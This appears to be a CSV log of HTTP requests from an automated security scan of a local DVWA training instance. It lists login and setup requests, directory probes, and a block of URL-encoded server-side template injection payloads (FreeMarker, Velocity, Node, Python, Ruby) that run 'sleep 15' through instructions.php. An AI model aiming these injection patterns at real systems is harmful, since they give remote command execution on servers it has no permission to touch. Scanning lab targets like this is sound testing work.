ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
3623,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/setup.php,200,OK,2,272,4145
3625,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,1,281,0
3626,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/setup.php,200,OK,2,272,4156
3628,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1523
3630,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,22,282,0
3631,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,14,281,0
3632,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,2143
3633,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/setup.php,200,OK,3,272,4075
3636,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,1,281,0
3637,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,15,282,0
3638,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,15,272,2143
3640,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,3,281,0
3641,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/setup.php,200,OK,3,272,4075
3643,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1573
3644,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,2,281,0
3646,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/setup.php,200,OK,2,272,4195
3648,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,5,281,0
3649,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,17,272,2093
3650,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,21,282,0
3652,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3653,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/setup.php,200,OK,2,272,4145
3654,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1523
3657,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,3,281,0
3658,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,3,281,0
3659,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/setup.php,200,OK,4,272,4195
3661,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,1,281,0
3662,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,8,272,1523
3664,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/setup.php,200,OK,1,272,4156
3666,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,5,281,0
3667,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,20,282,0
3668,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,15,272,2143
3670,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,1,281,0
3671,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/setup.php,200,OK,1,272,4145
3673,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1523
3674,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,1,281,0
3676,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3677,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,3,281,0
3678,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,1,281,0
3679,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,3,272,1662
3681,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,1,281,0
3682,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3683,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1662
3685,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3686,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,3,281,0
3687,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,3,272,1612
3689,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,1,281,0
3690,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,6,281,0
3691,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,5,281,0
3692,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1662
3694,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,20,281,0
3695,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,3,281,0
3696,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,1,281,0
3697,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,2,281,0
3698,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1662
3700,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3701,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/dvwa/images,301,Moved Permanently,0,215,319
3702,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1662
3704,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3705,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,10,281,0
3706,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1612
3707,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,2,281,0
3709,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3710,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/setup.php,302,Found,2,281,0
3711,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1612
3713,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,3,281,0
3714,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,1,272,1562
3716,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3717,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,1,272,1562
3719,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,3,281,0
3720,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1562
3722,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,4,281,0
3723,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1562
3725,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3726,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1562
3728,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3729,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1562
3731,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3732,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1562
3734,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3735,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,3,272,1562
3737,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3738,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1562
3740,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3741,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1562
3743,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3744,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1562
3746,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3747,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1562
3749,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3750,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,3,272,1562
3752,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,1,281,0
3753,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1562
3755,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3756,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,2,272,1562
3758,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3759,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,1,281,0
3760,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,5,281,0
3761,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3762,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3763,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3764,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3765,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3766,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3767,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3768,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3769,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,2,281,0
3770,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php,302,Found,1,281,0
3771,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/dvwa/js,301,Moved Permanently,1,211,315
3772,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,200,OK,2,273,14684
3773,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,200,OK,3,273,14014
3774,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,200,OK,1,273,14014
3775,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,200,OK,8,273,14014
3776,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,200,OK,1,273,14014
3777,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,200,OK,3,273,14014
3778,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,200,OK,4,273,14014
3779,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/var,404,Not Found,2,161,278
3780,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/var/www,404,Not Found,1,161,282
3781,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,200,OK,13,273,14014
3782,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,200,OK,1,273,14014
3783,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%3C%25%3D%25x%28sleep+15%29%25%3E,200,OK,2,273,14014
3785,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/var/www/html,404,Not Found,1,161,287
3784,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%23%7B%25x%28sleep+15%29%7D,200,OK,3,273,14014
3786,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/var/www/html/config,404,Not Found,1,161,294
3787,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/instructions.php?doc=%7Bsystem%28%22sleep+15%22%29%7D,200,OK,2,273,14014
3788,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/login.php,200,OK,4,272,1523
3790,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/setup.php,200,OK,4,272,4075
3792,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,POST,http://127.0.0.1:9090/login.php/,200,OK,2,272,1562
3793,Mon Mar 24 13:19:10 IST 2025,Mon Mar 24 13:19:10 IST 2025,GET,http://127.0.0.1:9090/,200,OK,9,414,1523
3794,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/docs,301,Moved Permanently,1,208,312
3795,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,POST,http://127.0.0.1:9090/setup.php/,200,OK,17,272,4676
3796,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/about.php/,200,OK,4,272,4840
3797,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/,200,OK,14,272,1523
3798,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/docs/,200,OK,1,172,1136
3799,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa,301,Moved Permanently,0,208,312
3801,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/css,301,Moved Permanently,1,212,316
3802,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/,200,OK,1,172,1502
3804,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/css/,200,OK,1,172,1531
3806,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/docs/DVWA_v1.3.pdf/,404,Not Found,12,161,294
3807,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/css/login.css/,404,Not Found,1,161,294
3808,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/images,301,Moved Permanently,1,215,319
3809,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/css/main.css/,404,Not Found,1,161,293
3810,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/images/,200,OK,3,172,2169
3812,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/images/RandomStorm.png/,404,Not Found,1,161,303
3813,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/images/login_logo.png/,404,Not Found,1,161,302
3814,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/js,301,Moved Permanently,0,211,315
3815,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/images/logo.png/,404,Not Found,5,161,296
3816,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/images/spanner.png/,404,Not Found,6,161,299
3817,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/js/,200,OK,6,172,1175
3819,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/js/add_event_listeners.js/,404,Not Found,1,161,306
3820,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/dvwa/js/dvwaPage.js/,404,Not Found,2,161,295
3821,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/favicon.ico/,404,Not Found,8,161,287
3822,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/instructions.php/,200,OK,2,273,14014
3823,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/instructions.php/,200,OK,3,273,14014
3824,Mon Mar 24 13:19:11 IST 2025,Mon Mar 24 13:19:11 IST 2025,GET,http://127.0.0.1:9090/login.php/,200,OK,2,272,1523
